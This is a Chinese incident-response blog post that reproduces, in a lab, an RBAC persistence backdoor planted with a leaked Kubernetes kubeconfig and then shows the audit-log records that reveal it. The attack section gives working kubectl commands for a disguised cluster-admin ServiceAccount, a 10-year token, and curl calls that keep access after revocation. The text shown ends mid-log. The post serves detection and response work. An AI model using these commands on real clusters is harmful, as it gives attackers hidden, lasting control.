---
title: k8s-kubeconfig泄露后的RBAC持久化后门排查
url: https://zgao.top/k8s-kubeconfig%e6%b3%84%e9%9c%b2%e5%90%8e%e7%9a%84rbac%e6%8c%81%e4%b9%85%e5%8c%96%e5%90%8e%e9%97%a8%e6%8e%92%e6%9f%a5/
source: Zgao's blog
date: 2026-06-09
fetch_date: 2026-06-10T06:15:08.878793
---

# k8s-kubeconfig泄露后的RBAC持久化后门排查

# [Zgao's blog](https://zgao.top/)

愿有一日，安全圈的师傅们都能用上Zgao写的工具。

Toggle navigation

* [工具箱](https://zgao.top/tool/)
* [文章归档](https://zgao.top/archives/)
* [关于我](https://zgao.top/about-me/)
* [github](https://github.com/zgao264)
* Gmail

# k8s-kubeconfig泄露后的RBAC持久化后门排查

* [首页](https://zgao.top)
* [k8s-kubeconfig泄露后的RBAC持久化后门排查](https://zgao.top:443/k8s-kubeconfig%E6%B3%84%E9%9C%B2%E5%90%8E%E7%9A%84rbac%E6%8C%81%E4%B9%85%E5%8C%96%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5/)

[6月 9, 2026](https://zgao.top/2026/06/)

### k8s-kubeconfig泄露后的RBAC持久化后门排查

作者 [Zgao](https://zgao.top/author/zgao/)
在[[应急响应](https://zgao.top/category/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/)](https://zgao.top/k8s-kubeconfig%E6%B3%84%E9%9C%B2%E5%90%8E%E7%9A%84rbac%E6%8C%81%E4%B9%85%E5%8C%96%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5/)

```
攻击者
  │
  ├─ 1. 使用泄露 kubeconfig 连接公网 apiserver
  │
  ├─ 2. 创建后门 ServiceAccount（伪装成系统组件名）
  │
  ├─ 3. 创建 ClusterRole（全权限）
  │
  ├─ 4. 创建 ClusterRoleBinding（将后门 SA 绑定到 cluster-admin）
  │
  ├─ 5. 用 TokenRequest API 生成长期 token（不存储在 apiserver，难以追踪）
  │
  └─ 6. 防御方删除原始 kubeconfig 对应的 RBAC binding
         ↓
       原始 kubeconfig → Forbidden （请求被拒绝）
       后门 SA token  → cluster-admin 全权限 （仍能正常使用）
```

经验丰富的攻击者拿到一份泄露的 kubeconfig（cluster-admin 权限）后，**第一件事可能不是立刻操作，而是先给自己埋一个独立的后门**——即使原始 kubeconfig 被吊销，后门依然有效。`kubeadm certs renew` 和删除 ClusterRoleBinding 对已植入的后门无效，因为后门使用独立的身份凭证。

文章目录

[ ]

* [实验环境](#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83 "实验环境")
* [攻击链复现](#%E6%94%BB%E5%87%BB%E9%93%BE%E5%A4%8D%E7%8E%B0 "攻击链复现")
  + [枚举集群现有 RBAC](#%E6%9E%9A%E4%B8%BE%E9%9B%86%E7%BE%A4%E7%8E%B0%E6%9C%89_RBAC "枚举集群现有 RBAC")
  + [植入后门三件套](#%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8%E4%B8%89%E4%BB%B6%E5%A5%97 "植入后门三件套")
  + [生成长期 token（不留痕迹）](#%E7%94%9F%E6%88%90%E9%95%BF%E6%9C%9F_token%EF%BC%88%E4%B8%8D%E7%95%99%E7%97%95%E8%BF%B9%EF%BC%89 "生成长期 token（不留痕迹）")
  + [验证后门有效](#%E9%AA%8C%E8%AF%81%E5%90%8E%E9%97%A8%E6%9C%89%E6%95%88 "验证后门有效")
  + [模拟吊销泄露的kubeconfig](#%E6%A8%A1%E6%8B%9F%E5%90%8A%E9%94%80%E6%B3%84%E9%9C%B2%E7%9A%84kubeconfig "模拟吊销泄露的kubeconfig")
* [Audit Log 审计攻击痕迹](#Audit_Log_%E5%AE%A1%E8%AE%A1%E6%94%BB%E5%87%BB%E7%97%95%E8%BF%B9 "Audit Log 审计攻击痕迹")
  + [后门植入的三条关键记录](#%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E7%9A%84%E4%B8%89%E6%9D%A1%E5%85%B3%E9%94%AE%E8%AE%B0%E5%BD%95 "后门植入的三条关键记录")
  + [检查 TokenRequest API 是否被滥用](#%E6%A3%80%E6%9F%A5_TokenRequest_API_%E6%98%AF%E5%90%A6%E8%A2%AB%E6%BB%A5%E7%94%A8 "检查 TokenRequest API 是否被滥用")
  + [jq 快速筛查后门植入行为](#jq_%E5%BF%AB%E9%80%9F%E7%AD%9B%E6%9F%A5%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E8%A1%8C%E4%B8%BA "jq 快速筛查后门植入行为")
* [应急排查如何发现后门](#%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E5%90%8E%E9%97%A8 "应急排查如何发现后门")
  + [找所有绑定高权限角色的 ClusterRoleBinding](#%E6%89%BE%E6%89%80%E6%9C%89%E7%BB%91%E5%AE%9A%E9%AB%98%E6%9D%83%E9%99%90%E8%A7%92%E8%89%B2%E7%9A%84_ClusterRoleBinding "找所有绑定高权限角色的 ClusterRoleBinding")
  + [找所有非默认的 ServiceAccount](#%E6%89%BE%E6%89%80%E6%9C%89%E9%9D%9E%E9%BB%98%E8%AE%A4%E7%9A%84_ServiceAccount "找所有非默认的 ServiceAccount")
* [应急处置顺序](#%E5%BA%94%E6%80%A5%E5%A4%84%E7%BD%AE%E9%A1%BA%E5%BA%8F "应急处置顺序")

## 实验环境

| 角色 | 规格 | 公网 IP | 内网 IP |
| --- | --- | --- | --- |
| master | S5.LARGE8 4C8G Ubuntu 22.04 | 129.xxx.50.247 | 10.0.1.14 |
| worker node | S5.MEDIUM4 2C4G Ubuntu 22.04 | 43.xxx.182.96 | 10.0.1.2 |
| centos-node | S5.MEDIUM4 2C4G CentOS 7.9 | 43.xxx.29.38 | 10.0.1.11 |

* Kubernetes v1.30.14，kubeadm 部署，flannel CNI
* apiserver 开启 Audit Log（`/var/log/kubernetes/audit.log`）
* 模拟攻击者已持有泄露的 kubeconfig（server 指向公网 IP，cluster-admin 权限）

```
# 攻击者视角：验证泄露的 kubeconfig 可用
export KUBECONFIG=./lab/attack/leaked-kubeconfig.yaml
kubectl auth whoami

ATTRIBUTE   VALUE
Username    kubernetes-admin
Groups      [kubeadm:cluster-admins system:authenticated]
```

## 攻击链复现

### 枚举集群现有 RBAC

攻击者拿到 kubeconfig 后首先摸清 RBAC 现状，找到高权限 binding，了解命名规律，为后续伪装做准备：

```
# 枚举所有 ClusterRoleBinding，找 cluster-admin 相关的
kubectl get clusterrolebindings -o wide | grep cluster-admin

# 列出 kube-system 里的 ServiceAccount，参考系统组件命名规律
kubectl get sa -n kube-system
```

![](https://zgao.top/wp-content/uploads/2026/06/image-27-1024x658.png)

可以观察到系统 SA 名称风格为 `xxx-controller`、`xxx-manager`，kube-system 命名空间，下一步据此伪装。

### 植入后门三件套

真实攻击（RBAC Buster）中，攻击者将后门命名为 `kube-controller` / `system:controller:kube-controller`，故意仿造系统组件名称。本实验使用 `kube-metrics-controller` 演示伪装命名：

```
# 步骤一：创建伪装的 ServiceAccount
kubectl create serviceaccount kube-metrics-controller -n kube-system

# 步骤二：创建全权限 ClusterRole（也可以直接复用内置的 cluster-admin）
kubectl create clusterrole kube-metrics-controller \
    --verb='*' \
    --resource='*'

# 步骤三：将 SA 绑定到全权限角色
kubectl create clusterrolebinding system:controller:kube-metrics-controller \
    --clusterrole=kube-metrics-controller \
    --serviceaccount=kube-system:kube-metrics-controller
```

![](https://zgao.top/wp-content/uploads/2026/06/image-28-1024x461.png)

整个过程不到 10 秒，后门已植入完毕。

### 生成长期 token（不留痕迹）

```
# 用 TokenRequest API 生成 10 年有效期的 token
kubectl create token kube-metrics-controller \
    -n kube-system \
    --duration=87600h \
  > backdoor_token.txt
```

![](https://zgao.top/wp-content/uploads/2026/06/image-30-1024x347.png)

### 验证后门有效

```
TOKEN=$(cat backdoor_token.txt)

# 用后门 token 调用 apiserver
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://129.226.50.247:6443/api/v1/nodes \
  | jq '[.items[].metadata.name]'
```

![](https://zgao.top/wp-content/uploads/2026/06/image-29-1024x643.png)

### 模拟吊销泄露的kubeconfig

防御方发现 kubeconfig 泄露，执行吊销操作：

```
# 防御方操作：删除泄露 kubeconfig 对应的 ClusterRoleBinding
kubectl delete clusterrolebinding kubeadm:cluster-admins

# 原始泄露的 kubeconfig → 已失效
KUBECONFIG=./lab/attack/leaked-kubeconfig.yaml kubectl get pods
# Error from server (Forbidden): pods is forbidden:
# User "kubernetes-admin" cannot list resource "pods"...

curl -sk \
  -H "Authorization: Bearer $TOKEN" \
  https://129.226.50.247:6443/api/v1/nodes \
  | jq '[.items[].metadata.name]'
```

![](https://zgao.top/wp-content/uploads/2026/06/image-32-1024x542.png)

验证结果：**防御方以为关上了门，攻击者其实仍在屋内。**

```
- auth whoami 还能通 → 认证（Authentication）没问题，证书本身有效，apiserver 认识你是谁
- get pods Forbidden → 鉴权（Authorization）被切断，RBAC 查不到任何允许这个用户列 Pod 的规则

两个阶段是独立的：

请求 → 认证（你是谁？）→ 鉴权（你能做什么？）→ 准入
         ↑                    ↑
   证书有效，通过          binding 没了，拒绝

auth whoami 只走认证阶段，所以还能返回结果。get pods 要走到鉴权阶段才会 Forbidden。
```

后门 SA `kube-metrics-controller` 与原始 kubeconfig 的 `kubernetes-admin` 是完全独立的身份。删除原始 binding 不影响后门 binding。

## Audit Log 审计攻击痕迹

### 后门植入的三条关键记录

前提是开启了 audit log 的集群，以上操作才全部有迹可查。这里把攻击的日志提取出来，供排查参考。

**创建后门 ServiceAccount**

```
{
  "requestReceivedTimestamp": "2026-06-08T07:36:51.320243Z",
  "verb": "create",
  "user": {
    "username": "kubernetes-admin",
    "groups": ["kubeadm:cluster-admins", "system:authenticated"]
  },
  "sourceIPs": ["159.196.171.95"],
  "userAgent": "kubectl/v1.36.1 (darwin/arm64) kubernetes/7569396",
  "objectRef": {
    "resource": "serviceaccounts",
    "namespace": "kube-system",
    "name": "kube-metrics-controller"
  },
  "responseStatus": { "code": 201 }
}
```

**创建后门 ClusterRoleBinding**

```
{
  "requestReceivedTimestamp": "2026-06-08T07:36:54.064706Z",
  "verb": "create",
  "user": {
    "username": "kubernetes-admin",
    "groups": ["kubeadm:cluster-admins", "system:authenticated"]
  },
  "sourceIPs": ["159.196.171.95"],
  "userAgent": "kubectl/v1.36.1 (darwin/arm64) kubernetes/7569396",
  "objectRef": {
    "resource": "clusterrolebindings",
    "name": "system:controller:kube-metrics-controller"
  },
  "requestObject": {
    "subjects": [{"kind": "ServiceAccount", "name": "kube-metrics-controller", "namespace": "kube-system"}],
    "roleRef": {"kind": "ClusterRole", "name": "cluster-admin"}
  },
  "responseStatus": { "code": 201 }
}
```

**生成长期 token**

```
{
  "requestReceivedTimestamp": "2026-06-08T07:36:57.262985Z",
  "verb": "create",
  "user": {
    "username": "kubernetes-admin",
    "groups": ["kubeadm:cluster-admins", "system:authenticated"]
  },
  "sourceIPs": ["159.196.171.95"],
  "objectRef": {
    "resource": "serviceaccounts",
  ...